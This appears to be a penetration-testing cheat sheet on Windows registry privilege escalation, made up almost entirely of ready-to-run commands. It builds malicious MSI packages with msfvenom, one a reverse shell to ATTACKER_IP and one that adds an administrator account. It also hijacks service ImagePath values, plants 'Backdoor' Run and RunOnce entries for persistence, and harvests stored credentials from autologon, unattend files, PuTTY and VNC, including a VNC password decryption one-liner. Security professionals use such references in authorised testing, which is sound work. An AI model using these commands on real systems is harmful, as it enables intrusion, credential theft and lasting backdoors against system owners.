# Windows Registry Privilege Escalation

## Key Registry Locations for PrivEsc

---

## AlwaysInstallElevated

Allows MSI packages to install with SYSTEM privileges.

### Check if Enabled

```cmd
# Both must be set to 1 for exploit to work
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
# PowerShell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
```

### Exploit

```bash
# Generate malicious MSI on attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi

# Or to add user
msfvenom -p windows/exec CMD='net user hacker Password123! /add && net localgroup Administrators hacker /add' -f msi -o adduser.msi
```

```cmd
# On target - install MSI
msiexec /quiet /qn /i shell.msi

# Alternative
msiexec /q /i shell.msi
```

### Using PowerUp

```powershell
. .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated
Write-UserAddMSI
```

---

## AutoLogon Credentials

Credentials stored for automatic login.

### Check

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

```powershell
# PowerShell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object DefaultUserName, DefaultPassword, DefaultDomainName
```

### Key Values

- `DefaultUserName` - Username
- `DefaultPassword` - Password (cleartext!)
- `DefaultDomainName` - Domain
- `AutoAdminLogon` - If set to 1, autologon is enabled

---

## Service Registry Permissions

### Find Weak Service Permissions

```cmd
# Check all services
for /f "tokens=*" %a in ('reg query HKLM\SYSTEM\CurrentControlSet\Services') do @(accesschk.exe /accepteula -kvuqsw "%a" 2>nul | findstr /i "BUILTIN\Users Everyone")
```

```powershell
# PowerShell - check specific service
Get-Acl -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService' | Format-List
```

### Exploit - Modify ImagePath

```cmd
# If you have write access to service registry key
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe" /f

# Restart service
sc stop VulnerableService
sc start VulnerableService
```

---

## RunOnce / Run Keys

Programs that run at startup/login.

### Check

```cmd
# Machine-level (runs as SYSTEM at startup)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# User-level (runs as user at login)
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# 64-bit specific
reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
```

### Exploit (if writable)

```cmd
# Add malicious entry
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\shell.exe" /f

# Or at user level
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\shell.exe" /f
```

### Check Permissions on Run Binary

```cmd
# If a legitimate run key points to writable binary
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Check each path
icacls "C:\Path\To\Binary.exe"
```

---

## Unattend/Sysprep Files

May contain credentials from Windows deployment.

### Common Locations

```cmd
# Check registry for unattend locations
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\State"

# Common file locations (not registry, but related)
type C:\unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep.inf
type C:\Windows\system32\sysprep\sysprep.xml
```

### Look for Passwords

```powershell
# Search unattend files for passwords
Get-ChildItem C:\ -Recurse -Include *unattend*,*sysprep* -ErrorAction SilentlyContinue | Select-String -Pattern "password" -CaseSensitive:$false
```

---

## Putty Saved Sessions

### Check for Saved Sessions

```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

```powershell
Get-ItemProperty -Path 'HKCU:\Software\SimonTatham\PuTTY\Sessions\*' | Select-Object PSChildName, HostName, UserName, ProxyUsername, ProxyPassword
```

---

## VNC Passwords

### Check

```cmd
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server" /v Password
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password
```

### Decrypt VNC Password

```bash
# VNC passwords are encrypted with fixed key
# Use vncpwd or online decoders
echo "ENCRYPTED_VALUE" | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
```

---

## Searching Registry for Passwords

### Command Line

```cmd
# Search for "password" in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Search for "passwd"
reg query HKLM /f passwd /t REG_SZ /s

# Search for "admin"
reg query HKLM /f admin /t REG_SZ /s
```

### PowerShell

```powershell
# Search registry for passwords
Get-ChildItem -Path HKLM:\ -Recurse -ErrorAction SilentlyContinue | Get-ItemProperty | Where-Object { $_.PSObject.Properties.Value -match 'password' } | Select-Object PSPath, PSChildName
```

---

## PowerUp Registry Checks

```powershell
. .\PowerUp.ps1

# All registry checks
Get-RegistryAutoLogon
Get-RegistryAlwaysInstallElevated

# Modifiable service registry
Get-ModifiableService
```

---

## Registry Persistence (Post-Exploitation)

Once you have SYSTEM:

```cmd
# Add backdoor to Run
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f

# Add to RunOnce
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f

# Enable AlwaysInstallElevated for future
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
```

---

## Quick Reference - Registry Paths

| Path | Purpose |
|------|---------|
| HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer | AlwaysInstallElevated |
| HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon | AutoLogon creds |
| HKLM\SYSTEM\CurrentControlSet\Services\ | Service configurations |
| HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Startup programs |
| HKCU\Software\SimonTatham\PuTTY\Sessions | PuTTY saved sessions |
| HKCU\Software\ORL\WinVNC3 | VNC passwords |



